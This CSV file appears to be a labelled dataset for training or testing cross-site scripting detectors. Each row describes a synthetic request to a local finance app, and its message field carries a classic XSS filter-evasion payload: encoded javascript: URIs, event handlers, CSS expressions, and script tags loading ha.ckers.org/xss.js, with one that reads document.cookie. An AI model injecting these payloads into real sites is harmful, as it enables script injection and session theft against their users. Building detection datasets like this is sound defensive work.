mimetype,timestamp,request_uri,user_ip,content_length,request_type,user_agent,message,is_xss
"application/json, image/png, */*",1619774632590565825,http://127.0.0.1:5000/credit/hxtyunpj,172.17.81.170,39574,POST,Mozilla/4.0 (compatible; MSIE 5.0; Linux 2.4.20-13.7 i686) Opera 6.11  [de],"<IMG onmouseover=""alert('xxs')"">",true
"image/png, */*",124825572046514373,http://127.0.0.1:5000/fund/66gkq9id,10.123.87.20,47190,GET,"Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.10 (KHTML, like Gecko) Chrome/8.0.552.200 Safari/534.10","<IMG SRC=/ onerror=""alert(String.fromCharCode(88,83,83))""></img>",true
"text/html, image/jpeg, application/json, text/plain, */*",8117163901357775350,http://127.0.0.1:5000/mortgage/q6aonyxo,10.19.232.143,81800,POST,Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 6.0; en-US),<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;,true
"application/json, text/html, image/png, image/jpeg, */*",5371693695033078745,http://127.0.0.1:5000/fund/oppbm3kh,10.103.217.6,72920,GET,Opera/9.80 (X11; Linux i686; U; it) Presto/2.7.62 Version/11.00,&#39;&#88;&#83;&#83;&#39;&#41;>,true
"image/png, application/json, */*",980895922762745440,http://127.0.0.1:5000/loan/pap5alj6,10.63.156.130,40878,POST,Opera/9.50 (Windows NT 5.1; U; nn),<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&,true
"image/jpeg, text/html, image/png, application/json, */*",6526703059581309368,http://127.0.0.1:5000/balance/rntk0wm0,10.12.237.73,9915,POST,Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.1),#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>,true
"text/plain, */*",4944158320207309405,http://127.0.0.1:5000/credit/ac86q2ti,10.127.65.233,39956,POST,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.19577",<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>,true
"image/jpeg, application/json, text/html, text/plain, */*",4655277090542382323,http://127.0.0.1:5000/invest/i9lccqxk,172.23.185.164,706,GET,Mozilla/5.0 (Windows NT 5.1; U; tr; rv:1.8.0) Gecko/20060728 Firefox/1.5.0,"<IMG SRC=""jav	ascript:alert('XSS');"">",true
"application/json, text/html, text/plain, image/png, */*",7126023519067949351,http://127.0.0.1:5000/interest/dwjzu3r7,10.45.146.56,36393,POST,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.19582","<IMG SRC=""jav&#x09;ascript:alert('XSS');"">",true
"image/png, text/plain, */*",8802869101686130723,http://127.0.0.1:5000/credit/8nts0sp7,10.11.232.94,50429,POST,Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.6; he; rv:1.9.1b4pre) Gecko/20100405 Firefox/3.6.3plugin1,"<IMG SRC=""jav&#x0A;ascript:alert('XSS');"">",true
"image/jpeg, image/png, text/html, text/plain, */*",7271444021836806049,http://127.0.0.1:5000/portfolio/7dcdexqk,10.112.214.196,18972,GET,Mozilla/4.0 (compatible; MSIE 4.01; Windows 98),"<IMG SRC=""jav&#x0D;ascript:alert('XSS');"">",true
"application/json, image/png, text/plain, image/jpeg, */*",7929581095544095903,http://127.0.0.1:5000/mortgage/2ozk6wnh,10.54.54.119,43992,POST,"Mozilla/5.0 (Mozilla/5.0 (iPhone; U; CPU iPhone OS 2_0_1 like Mac OS X; fr-fr) AppleWebKit/525.18.1 (KHTML, like Gecko) Version/3.1.1 Mobile/5G77 Safari/525.20","<IMG SRC="" &#14;  javascript:alert('XSS');"">",true
"application/json, image/png, text/html, */*",8583635208680862526,http://127.0.0.1:5000/debit/53o4vl90,10.42.195.36,36975,POST,Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; InfoPath.1; SV1; .NET CLR 3.8.36217; WOW64; en-US),"<SCRIPT/XSS SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",true
"text/html, image/jpeg, application/json, text/plain, */*",7968485498896481298,http://127.0.0.1:5000/dividend/gktzav73,10.207.194.14,49718,POST,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246","<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert(""XSS"")>",true
"text/html, */*",5383682009425923405,http://127.0.0.1:5000/stock/6x5asn4n,10.75.218.187,9334,POST,"Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/124 (KHTML, like Gecko)","<SCRIPT/SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",true
"text/plain, image/jpeg, image/png, */*",99152820397555997,http://127.0.0.1:5000/mortgage/56uymqjs,10.165.233.253,9142,POST,Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; Media Center PC 6.0; InfoPath.3; MS-RTC LM 8; Zune 4.7,"<<SCRIPT>alert(""XSS"");//<</SCRIPT>",true
"image/jpeg, image/png, text/plain, */*",1872125817157994575,http://127.0.0.1:5000/capital/xdgr625p,10.187.12.201,97901,GET,Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; en) Opera 8.02,<SCRIPT SRC=http://ha.ckers.org/xss.js?< B >,true
"application/json, */*",3616176774514653403,http://127.0.0.1:5000/market/t3l8j5b2,10.200.241.223,6052,DELETE,Mozilla/4.0 (compatible; MSIE 5.0; Windows NT 6.0; Trident/4.0; InfoPath.1; SV1; .NET CLR 3.0.04506.648; .NET4.0C; .NET4.0E),<SCRIPT SRC=//ha.ckers.org/.j>,true
"text/plain, */*",2574696237155527828,http://127.0.0.1:5000/balance/bxvidyr9,10.212.132.140,28151,POST,"Mozilla/5.0 (Macintosh; U; PPC Mac OS X; ja-jp) AppleWebKit/125.4 (KHTML, like Gecko) Safari/125.9","<IMG SRC=""javascript:alert('XSS')""",true
"image/png, text/plain, text/html, */*",3351631090199363407,http://127.0.0.1:5000/debit/21khvjjp,10.6.124.142,59471,POST,"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36",<iframe src=http://ha.ckers.org/scriptlet.html <,true
"application/json, */*",5916229993410305499,http://127.0.0.1:5000/invest/eveowx8j,10.243.81.254,75424,OPTIONS,"Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.82 Safari/534.16","\"";alert('XSS');//",true
"application/json, text/plain, */*",7315375827619991016,http://127.0.0.1:5000/capital/stbrl7hh,10.0.184.242,99322,GET,Mozilla/4.0 (compatible; MSIE 5.0; Windows NT; DigExt; YComp 5.0.2.5),</script><script>alert('XSS');</script>,true
"image/png, */*",4885782513708610134,http://127.0.0.1:5000/withdrawal/569b1ldh,10.198.146.44,84706,GET,"Mozilla/5.0 (X11; CrOS i686 13.587.48) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.43 Safari/535.1","</TITLE><SCRIPT>alert(""XSS"");</SCRIPT>",true
"image/jpeg, */*",7457851865651059154,http://127.0.0.1:5000/debit/34l2h93j,10.155.56.249,42429,GET,Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0) chromeframe/10.0.648.205,"<INPUT TYPE=""IMAGE"" SRC=""javascript:alert('XSS');"">",true
"image/jpeg, image/png, text/html, text/plain, */*",4165013922186163410,http://127.0.0.1:5000/balance/xfc5junu,10.115.38.131,40142,POST,"Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.20 Safari/535.1","<BODY BACKGROUND=""javascript:alert('XSS')"">",true
"text/html, text/plain, */*",1669820541356950518,http://127.0.0.1:5000/withdrawal/3b910qpo,10.102.193.198,17709,POST,"Mozilla/5.0 (Windows; U; Windows NT 5.1; ru-RU) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16","<IMG DYNSRC=""javascript:alert('XSS')"">",true
"text/plain, application/json, image/jpeg, image/png, */*",1504360090429345099,http://127.0.0.1:5000/equity/pfxlzaqo,10.184.230.237,87850,POST,Opera/7.50 (Windows NT 5.1; U)  [en],"<IMG LOWSRC=""javascript:alert('XSS')"">",true
"image/jpeg, */*",3632002124010866258,http://127.0.0.1:5000/debit/4c6n389n,10.183.61.13,82086,POST,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:17.0) Gecko/20100101 Firefox/17.0.6,"<STYLE>li {list-style-image: url(""javascript:alert('XSS')"");}</STYLE><UL><LI>XSS</br>",true
"text/html, text/plain, */*",3848170966325036002,http://127.0.0.1:5000/credit/eiw4fda4,10.22.7.216,23215,POST,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/46.0.2486.0 Safari/537.36 Edge/13.10586,"<IMG SRC='vbscript:msgbox(""XSS"")'>",true
"application/json, */*",7250937150974336003,http://127.0.0.1:5000/withdrawal/ovbapvdk,10.131.241.214,74809,POST,"Mozilla/5.0 (Macintosh; U; PPC Mac OS X; fr) AppleWebKit/418.9.1 (KHTML, like Gecko) Safari/419.3","<IMG SRC=""livescript:[code]"">",true
"image/jpeg, */*",4879680839038451123,http://127.0.0.1:5000/mortgage/4nxz1x6z,10.114.175.114,19604,OPTIONS,Mozilla/5.0 (X11; U; Linux i686; en_US; rv:1.8.1b1) Gecko/20060813 Firefox/2.0b1,<BODY ONLOAD=alert('XSS')>,true
"application/json, image/jpeg, text/html, */*",5190307793388883193,http://127.0.0.1:5000/credit/80hzy9ax,10.99.99.39,37607,POST,Opera/6.01 (Windows 2000; U)  [de],"<BGSOUND SRC=""javascript:alert('XSS');"">",true
"text/html, image/jpeg, */*",7297708122225399531,http://127.0.0.1:5000/stock/s4amvt80,10.213.214.21,68018,DELETE,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17720","<BR SIZE=""&{alert('XSS')}"">",true
"image/png, image/jpeg, application/json, */*",956282641285590198,http://127.0.0.1:5000/withdrawal/1aiv6o5g,10.227.203.245,11470,POST,"Mozilla/5.0 (Macintosh; U; PPC Mac OS X; fr-fr) AppleWebKit/312.1 (KHTML, like Gecko) Safari/312","<LINK REL=""stylesheet"" HREF=""javascript:alert('XSS');"">",true
"image/png, */*",1228549965261407469,http://127.0.0.1:5000/capital/36uxr8as,10.66.125.219,16828,POST,"Mozilla/6.0 (Windows; U; Windows NT 6.0; en-US) Gecko/2009032609 (KHTML, like Gecko) Chrome/2.0.172.6 Safari/530.7","<LINK REL=""stylesheet"" HREF=""http://ha.ckers.org/xss.css"">",true
"application/json, */*",8088449835448008517,http://127.0.0.1:5000/mortgage/8m7dqnme,10.109.103.195,53744,GET,Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.0.14) Gecko/2009090217 Ubuntu/9.04 (jaunty) Firefox/3.0.14,<STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>,true
"image/png, application/json, */*",5750632519096049754,http://127.0.0.1:5000/balance/jfbl9w90,10.41.97.229,67397,GET,"Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.10 (KHTML, like Gecko) Chrome/8.0.552.200 Safari/534.10","<META HTTP-EQUIV=""Link"" Content=""<http://ha.ckers.org/xss.css>; REL=stylesheet"">",true
"text/plain, image/png, image/jpeg, application/json, */*",2717567800705733072,http://127.0.0.1:5000/capital/9z2zoomo,10.44.239.51,31196,PUT,Mozilla/4.0 (compatible; MSIE 5.0; Windows NT),"<STYLE>BODY{-moz-binding:url(""http://ha.ckers.org/xssmoz.xml#xss"")}</STYLE>",true
"application/json, image/png, */*",1379334606838968178,http://127.0.0.1:5000/fund/6a94s9zr,10.248.230.114,96942,POST,Mozilla/4.0 (compatible; MSIE 5.00; Windows 98),"<STYLE>@im\port'\ja\vasc\ript:alert(""XSS"")';</STYLE>",true
"text/html, image/png, */*",3231244444653406072,http://127.0.0.1:5000/portfolio/l8nsj0an,10.185.26.34,66843,POST,"Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.15 (KHTML, like Gecko) Ubuntu/10.04 Chromium/10.0.612.3 Chrome/10.0.612.3 Safari/534.15","<IMG STYLE=""xss:expr/*XSS*/ession(alert('XSS'))"">",true
"text/plain, */*",6024536451261223855,http://127.0.0.1:5000/portfolio/4fg416gt,10.129.188.122,52133,POST,Opera/9.64 (X11; Linux x86_64; U; en-GB) Presto/2.1.1,"exp/*<A STYLE='no\xss:noxss(""*//*"");",true
"application/json, */*",1558476774545111847,http://127.0.0.1:5000/loan/2a7el9bw,10.97.136.19,4368,GET,Opera/7.10 (Windows NT 4.0; U)  [de],"xss:ex/*XSS*//*/*/pression(alert(""XSS""))'>",true
"application/json, text/html, */*",797302733605231569,http://127.0.0.1:5000/withdrawal/1ch504a3,172.17.179.151,40417,DELETE,"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/533.3 (KHTML, like Gecko) Chrome/5.0.353.0 Safari/533.3","<STYLE TYPE=""text/javascript"">alert('XSS');</STYLE>",true
"text/plain, */*",1635245496469971695,http://127.0.0.1:5000/dividend/vkc6kb9m,10.7.3.63,59294,POST,"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/533.18.1 (KHTML, like Gecko) Version/4.0.5 Safari/531.22.7","<STYLE>.XSS{background-image:url(""javascript:alert('XSS')"");}</STYLE><A CLASS=XSS></A>",true
"text/plain, image/png, text/html, image/jpeg, */*",4686594291823376635,http://127.0.0.1:5000/equity/t975w26p,10.187.232.74,99200,POST,Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.7.12) Gecko/20051127 Firefox/1.0.7,"<STYLE type=""text/css"">BODY{background:url(""javascript:alert('XSS')"")}</STYLE>",true
"image/jpeg, image/png, */*",358778789520465553,http://127.0.0.1:5000/credit/ltt8tvqi,10.89.12.90,67790,POST,Opera/9.25 (X11; Linux i686; U; fr),"<XSS STYLE=""xss:expression(alert('XSS'))"">",true
"application/json, image/jpeg, text/plain, */*",589132670076538321,http://127.0.0.1:5000/invest/y65slnji,10.141.165.28,11143,POST,"Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_4_11; nl-nl) AppleWebKit/533.16 (KHTML, like Gecko) Version/4.1 Safari/533.16","<XSS STYLE=""behavior: url(xss.htc);"">",true
"text/html, */*",4072563521704308548,http://127.0.0.1:5000/credit/4escu53u,10.223.253.12,19448,PUT,Opera/8.51 (X11; Linux x86_64; U; en),¼script¾alert(¢XSS¢)¼/script¾,true
"application/json, image/png, */*",3289447372970379571,http://127.0.0.1:5000/interest/8fnpjztt,10.29.95.141,63535,GET,Mozilla/4.0 (compatible; MSIE 5.0; Windows 98) Opera 6.0  [de],"<META HTTP-EQUIV=""refresh"" CONTENT=""0;url=javascript:alert('XSS');"">",true
"text/plain, image/jpeg, image/png, text/html, */*",864530528075532126,http://127.0.0.1:5000/loan/bf4yx0em,10.13.207.144,59553,POST,"Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/125.4 (KHTML, like Gecko) Safari/100","<META HTTP-EQUIV=""refresh"" CONTENT=""0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K"">",true
"text/html, application/json, image/jpeg, text/plain, */*",1630367499880133907,http://127.0.0.1:5000/dividend/apa2znru,10.113.45.63,19187,POST,"Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/85.8.5 (KHTML, like Gecko) Safari/85.8.1","<META HTTP-EQUIV=""refresh"" CONTENT=""0; URL=http://;URL=javascript:alert('XSS');"">",true
"image/png, */*",4111338032812358418,http://127.0.0.1:5000/loan/u6xlwfkt,10.71.228.17,29414,PUT,Opera/9.23 (X11; Linux i686; U; en),"<IFRAME SRC=""javascript:alert('XSS');""></IFRAME>",true
"image/png, application/json, image/jpeg, text/plain, */*",1792894819818949672,http://127.0.0.1:5000/fund/nh26it86,10.71.168.156,33594,POST,Opera/6.05 (Windows XP; U)  [de],"<IFRAME SRC=# onmouseover=""alert(document.cookie)""></IFRAME>",true
"text/plain, image/jpeg, */*",2141769770129619759,http://127.0.0.1:5000/credit/pamkh50c,10.230.242.5,7583,CONNECT,"Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/124 (KHTML, like Gecko)","<FRAMESET><FRAME SRC=""javascript:alert('XSS');""></FRAMESET>",true
"text/plain, application/json, image/jpeg, */*",6731709763984134220,http://127.0.0.1:5000/mortgage/cxjub3lz,10.150.84.145,213,GET,"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_3; ru-ru) AppleWebKit/533.16 (KHTML, like Gecko) Version/5.0 Safari/533.16","<TABLE BACKGROUND=""javascript:alert('XSS')"">",true
"image/jpeg, */*",5006106569303655614,http://127.0.0.1:5000/debit/oeoxl67k,10.144.34.124,24906,OPTIONS,"Mozilla/5.0 (X11; U; FreeBSD i386; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.204 Safari/534.16","<TABLE><TD BACKGROUND=""javascript:alert('XSS')"">",true
"image/png, application/json, text/html, */*",5198227849707241863,http://127.0.0.1:5000/dividend/8tnhr89b,10.79.98.85,42508,DELETE,"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_6; en-us) AppleWebKit/530.6+ (KHTML, like Gecko) Version/3.1.2 Safari/525.20.1","<DIV STYLE=""background-image: url(javascript:alert('XSS'))"">",true
"image/png, image/jpeg, application/json, */*",1072666346032679018,http://127.0.0.1:5000/capital/ilx7bn2u,10.61.205.39,26592,OPTIONS,Opera/7.21 (Windows NT 5.1; U)  [en],"<DIV STYLE=""background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029"">",true
"image/jpeg, image/png, text/plain, */*",2180492875752438235,http://127.0.0.1:5000/mortgage/s0ximvvs,10.189.248.204,21904,POST,"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.66 Safari/535.11","<DIV STYLE=""background-image: url(&#1;javascript:alert('XSS'))"">",true
"text/plain, image/png, application/json, */*",3063017746432695461,http://127.0.0.1:5000/balance/txk5ovz6,10.201.84.13,22964,GET,"Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.8810.3391 Safari/537.36 Edge/18.14383","<DIV STYLE=""width: expression(alert('XSS'));"">",true
"application/json, text/plain, image/png, */*",1829097590452796858,http://127.0.0.1:5000/market/03d2fha1,10.19.119.19,47960,POST,Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0; SV1; .NET CLR 1.1.4322; .NET CLR 1.0.3705; .NET CLR 2.0.50727),<!--[if gte IE 4]><SCRIPT>alert('XSS');</SCRIPT><![endif]-->,true
"image/png, image/jpeg, text/html, */*",1275437416402633438,http://127.0.0.1:5000/portfolio/q1n9gbgk,10.13.248.192,49512,POST,"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_7; en-us) AppleWebKit/533.4 (KHTML, like Gecko) Version/4.1 Safari/533.4","<BASE HREF=""javascript:alert('XSS');//"">",true
"image/png, */*",2681017739638413437,http://127.0.0.1:5000/invest/jjg7saf6,10.24.246.0,1562,POST,Opera/9.80 (X11; Linux i686; U; pt-BR) Presto/2.2.15 Version/10.00,"<OBJECT TYPE=""text/x-scriptlet"" DATA=""http://ha.ckers.org/scriptlet.html""></OBJECT>",true
"image/jpeg, */*",3784537719286284669,http://127.0.0.1:5000/dividend/79gwr8xz,10.206.36.141,80583,GET,Opera/9.80 (Windows NT 6.1; U; fi) Presto/2.7.62 Version/11.00,"<!--#exec cmd=""/bin/echo '<SCR'""--><!--#exec cmd=""/bin/echo 'IPT SRC=http://ha.ckers.org/xss.js></SCRIPT>'""-->",true
"image/jpeg, text/plain, application/json, text/html, */*",1519402016034769682,http://127.0.0.1:5000/credit/jekug6sa,10.81.2.158,16874,POST,Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1; Media Center PC 3.0; .NET CLR 1.0.3705; .NET CLR 1.1.4322; .NET CLR 2.0.50727; InfoPath.1),"<? echo('<SCR)';echo('IPT>alert(""XSS"")</SCRIPT>'); ?>",true
"image/png, image/jpeg, text/plain, text/html, */*",557607514575608911,http://127.0.0.1:5000/debit/r093e6cf,10.157.72.10,53687,POST,Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0; Q312461; T312461),"<IMG SRC=""http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode"">",true
"application/json, */*",8751778049744857402,http://127.0.0.1:5000/fund/7b6u3315,10.210.58.23,83307,PUT,Mozilla/5.0 (X11; FreeBSD amd64; rv:5.0) Gecko/20100101 Firefox/5.0,"<META HTTP-EQUIV=""Set-Cookie"" Content=""USERID=<SCRIPT>alert('XSS')</SCRIPT>"">",true
"text/html, application/json, text/plain, */*",8970767723885624313,http://127.0.0.1:5000/deposit/yqmo1y3e,10.233.134.97,98207,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246","<HEAD><META HTTP-EQUIV=""CONTENT-TYPE"" CONTENT=""text/html; charset=UTF-7""> </HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-",true
"application/json, text/plain, */*",5762214561560013891,http://127.0.0.1:5000/interest/zyn6wwv7,10.155.19.45,30695,GET,Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 2.0.50727; Media Center PC 6.0),"<SCRIPT a="">"" SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",true
"text/html, image/jpeg, application/json, image/png, */*",3226252217413573128,http://127.0.0.1:5000/loan/6pqacg1s,10.112.204.63,98005,GET,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17720","<SCRIPT ="">"" SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",true
"image/png, text/html, application/json, */*",968749554140291436,http://127.0.0.1:5000/transaction/xprse4pc,10.142.164.58,17379,POST,"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.204.0 Safari/532.0","<SCRIPT a="">"" '' SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",true
"text/html, image/jpeg, image/png, */*",1314631367721152099,http://127.0.0.1:5000/balance/z4d6vrgt,10.3.182.50,68828,GET,Mozilla/5.0 (Windows; U; Windows NT 5.1; pt-BR; rv:1.9.2.17) Gecko/20110420 Firefox/3.6.17 (.NET CLR 3.5.30729),"<SCRIPT ""a='>'"" SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",true
"text/html, image/jpeg, image/png, application/json, */*",5904172228913732868,http://127.0.0.1:5000/loan/6qqrhp0p,10.214.106.197,91351,POST,Mozilla/5.0 (X11; U; Linux i686; zh-TW; rv:1.8.1) Gecko/20061010 Firefox/2.0,"<SCRIPT a=`>` SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",true
"text/html, image/png, */*",7486001603422289864,http://127.0.0.1:5000/withdrawal/csjrelhs,10.81.166.48,5344,POST,Mozilla/5.0 (Windows; U; Windows NT 6.1; pl; rv:1.9.1) Gecko/20090624 Firefox/3.5 (.NET CLR 3.5.30729),"<SCRIPT a="">'>"" SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",true
"image/png, application/json, text/plain, text/html, */*",3043964097525735814,http://127.0.0.1:5000/loan/pvst7e0p,10.87.105.40,32113,POST,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14931,"<SCRIPT>document.write(""<SCRI"");</SCRIPT>PT SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",true
"text/plain, image/png, image/jpeg, text/html, */*",1679872815392301116,http://127.0.0.1:5000/withdrawal/1tv8yt35,10.114.197.162,82294,GET,Mozilla/4.0 (X11; MSIE 6.0; i686; .NET CLR 1.1.4322; .NET CLR 2.0.50727; FDM),"<A HREF=""http://66.102.7.147/"">XSS</A>",true
"text/html, text/plain, */*",7118395907985790158,http://127.0.0.1:5000/equity/6cytqajs,10.254.47.184,86061,DELETE,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246","0\""autofocus/onfocus=alert(1)--><video/poster/ error=prompt(2)>""-confirm(3)-""",true
"image/jpeg, image/png, */*",6591122478372668517,http://127.0.0.1:5000/debit/088b5xp2,10.145.180.205,34056,POST,"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_6; zh-tw) AppleWebKit/525.27.1 (KHTML, like Gecko) Version/3.2.1 Safari/525.27.1",veris-->group<svg/onload=alert(/XSS/)//,true
"image/jpeg, image/png, application/json, text/plain, */*",312397509840576344,http://127.0.0.1:5000/debit/slmnk10e,10.199.111.5,65698,GET,Chrome (AppleWebKit/537.1; Chrome50.0; Windows NT 6.3) AppleWebKit/537.36 (KHTML like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393,"#""><img src=M onerror=alert('XSS');>",true
"text/plain, application/json, */*",7976687647294173775,http://127.0.0.1:5000/interest/2vd88wzo,10.200.78.7,71113,GET,Opera/5.12 (Windows NT 5.1; U)  [de],element[attribute='<img src=x onerror=alert('XSS');>,true
"text/plain, image/jpeg, application/json, text/html, */*",1041784726161936169,http://127.0.0.1:5000/market/t2mo9bxa,10.240.184.251,7694,POST,Opera/9.5 (Windows NT 5.1; U; fr),"[<blockquote cite=""]"">["" onmouseover=""alert('RVRSH3LL_XSS');"" ]",true
"application/json, text/plain, image/png, image/jpeg, */*",6817570589403732428,http://127.0.0.1:5000/equity/hzdc8ai4,10.235.244.91,87555,POST,"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.21 (KHTML, like Gecko) Chrome/11.0.678.0 Safari/534.21",%22;alert%28%27RVRSH3LL_XSS%29//,true
"text/html, image/jpeg, text/plain, image/png, */*",1144158107534344872,http://127.0.0.1:5000/capital/ic5rthi5,10.11.61.165,79700,POST,Opera/9.61 (X11; Linux i686; U; de) Presto/2.1.1,javascript:alert%281%29;,true
"text/plain, */*",5146278313494691891,http://127.0.0.1:5000/capital/9kzhcrlk,10.103.149.82,59570,OPTIONS,Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 5.2),<w contenteditable id=x onfocus=alert()>,true
